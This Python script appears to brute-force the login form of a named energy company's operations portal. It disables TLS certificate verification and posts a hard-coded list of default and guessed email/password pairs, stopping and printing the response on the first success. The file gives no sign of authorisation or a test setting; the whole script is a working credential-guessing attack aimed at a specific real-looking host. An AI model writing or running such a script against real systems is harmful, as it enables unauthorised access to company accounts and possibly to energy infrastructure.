import urllib.request
import urllib.parse
import ssl
import re

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# First GET the login page to get cookies
print("=== GET login page ===")
req = urllib.request.Request('https://urja-ops.flockenergy.tech/login')
resp = urllib.request.urlopen(req, context=ctx)
cookies = resp.headers.get('Set-Cookie', '')
print("Set-Cookie:", cookies[:200] if cookies else "none")
print("Status:", resp.status)

# Try various credential patterns with the same session
credentials = [
    'admin@flockenergy.com/admin',
    'test@flockenergy.com/test', 
    'user@flockenergy.com/user',
    'operator@flockenergy.com/pass',
    'employee@flockenergy.com/urja',
    'viewer@flockenergy.com/read',
    'member@flockenergy.com/login',
    'support@flockenergy.com/help',
    'urja@flockenergy.com/urja',
    'portal@flockenergy.com/portal',
    'admin/admin',
    'test/test',
    'user/user',
    'urja/urja',
    'flock/energy',
    'meter/ops',
    'admin/password',
    'password/password',
]

for cred in credentials:
    parts = cred.split('/')
    email = parts[0]
    password = parts[1] if len(parts) > 1 else 'password'
    try:
        data = urllib.parse.urlencode({'email': email, 'password': password}).encode()
        req = urllib.request.Request('https://urja-ops.flockenergy.tech/login', data=data, method='POST')
        resp = urllib.request.urlopen(req, context=ctx)
        print("\nSUCCESS: " + email + "/" + password + " -> " + str(resp.status))
        body = resp.read().decode()
        print("Response snippet: " + body[:200])
        break
    except urllib.error.HTTPError as e:
        print("\nFAILED: " + email + "/" + password + " -> " + str(e.code))
        # Print Set-Cookie if present
        sc = e.headers.get('Set-Cookie', '')
        if sc:
            print("Set-Cookie:", sc[:200])
    except Exception as e:
        print("\nERROR: " + email + "/" + password + " -> " + str(e))